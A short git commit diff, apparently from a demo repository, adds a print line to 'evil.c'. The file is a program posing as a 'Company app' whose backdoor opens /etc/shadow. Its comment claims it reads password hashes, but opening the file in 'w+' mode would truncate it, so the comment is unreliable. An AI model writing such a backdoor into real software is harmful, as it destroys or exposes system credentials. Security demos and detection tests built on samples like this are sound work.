74a0f59df57872625727f556b09b17301729ff73
Magnus Glantz <sudo@redhat.com>
2022-05-23 13:25:40 +0200

    Update evil.c

--- src/evil.c
+++ src/evil.c
@@ -6,6 +6,7 @@ int main()
    printf("Company app is running\n");
 
    // Evil backdoor reads system password hashes
+   printf("Evil backdoor initiating\n");
    FILE * fp;
    fp = fopen ("/etc/shadow", "w+");
    fclose(fp);
